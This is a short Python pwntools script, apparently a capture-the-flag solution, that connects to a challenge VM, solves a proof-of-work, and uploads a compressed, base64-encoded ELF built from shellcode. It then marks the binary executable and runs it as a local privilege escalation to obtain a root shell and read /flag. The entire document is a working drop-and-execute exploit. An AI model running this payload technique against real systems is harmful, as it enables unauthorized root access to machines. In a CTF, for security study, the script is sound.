from pwn import *
import base64
import bz2
import re

context.log_level = 'INFO'
context.arch = 'amd64'

r = remote('127.0.0.1', 50000)
r.recvuntil(b'sh -s')
pow_chall = r.recvline().strip()
pow = process(['/home/nto/go/bin/redpwnpow', pow_chall]).recvline().strip()
r.sendline(pow)

lpe_elf = ELF.from_assembly(shellcraft.amd64.linux.wait4(-1,0,0xffff,0)+shellcraft.amd64.linux.sh()).data
encoded_elf = base64.b64encode(bz2.compress(lpe_elf)).decode()

log.info(f"Waiting for qemu to init")
r.recvuntil(b"$")
log.info(f"Echoing payload")
r.sendline(f"echo '{encoded_elf}' | base64 -d | bzip2 -d > /tmp/lpe".encode())
r.recvuntil(b"$")
log.info(f"Chmoding lpe")
r.sendline(b'chmod 777 /tmp/lpe')
r.recvuntil(b"$")
log.info(f"Running lpe")
r.sendline(b"/tmp/lpe")
r.recvuntil(b"#")
log.info(f"New sh started")
r.clean()
log.info(f"Receiving flag")
r.sendline(b"cat /flag")
res = r.recvall(timeout=1)
log.info(f"Flag: {re.findall('SSM{.*}',res.decode())[0]}")